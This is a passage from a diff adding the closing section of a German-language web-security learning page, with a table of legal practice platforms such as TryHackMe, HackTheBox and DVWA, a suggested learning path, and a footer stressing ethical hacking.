+            <tr><td style="color:#00ff88;font-family:'JetBrains Mono',monospace">TryHackMe</td><td>Guided Labs</td><td>Anfängerfreundlich, geführte Räume mit Erklärungen</td></tr>
+            <tr><td style="color:#4488ff;font-family:'JetBrains Mono',monospace">HackTheBox</td><td>CTF / Labs</td><td>Realistische Maschinen, Fortgeschrittene</td></tr>
+            <tr><td style="color:#ffaa00;font-family:'JetBrains Mono',monospace">PortSwigger Web Academy</td><td>Web Security</td><td>Kostenlos! Beste Web-Hacking Labs</td></tr>
+            <tr><td style="color:#ff4466;font-family:'JetBrains Mono',monospace">DVWA</td><td>Lokale Übung</td><td>Deliberately Vulnerable Web Application (lokal)</td></tr>
+            <tr><td style="color:#aa44ff;font-family:'JetBrains Mono',monospace">PentesterLab</td><td>Web Security</td><td>CVE-basierte Übungen, Zertifikate</td></tr>
+          </table>
+          <div class="defense-block">
+            <h4>🗺️ Empfohlener Lernpfad</h4>
+            <ul>
+              <li>Start: TryHackMe "Pre-Security" und "Jr Penetration Tester" Pfad</li>
+              <li>Web Focus: PortSwigger Web Security Academy (100% kostenlos)</li>
+              <li>Praxis: DVWA lokal mit Docker aufsetzen und alle Schwachstellen testen</li>
+              <li>Fortgeschritten: HackTheBox CTF-Challenges & OSCP-Zertifizierung anstreben</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+    <div style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted);text-align:center;margin-bottom:16px">Seite erstellt von <a href="https://github.com/AimonKied" target="_blank" rel="noopener" style="color:var(--muted);text-decoration:underline dotted">AimonKied</a></div>
+    <p style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted);text-align:center;padding-bottom:60px">
+      // WebHack.wiki · Für Bildungszwecke · Always hack ethically ⚡ · <span id="siteVersion"></span>
+    </p>
+  </main>
+</div>
+
+</body>
+</html>
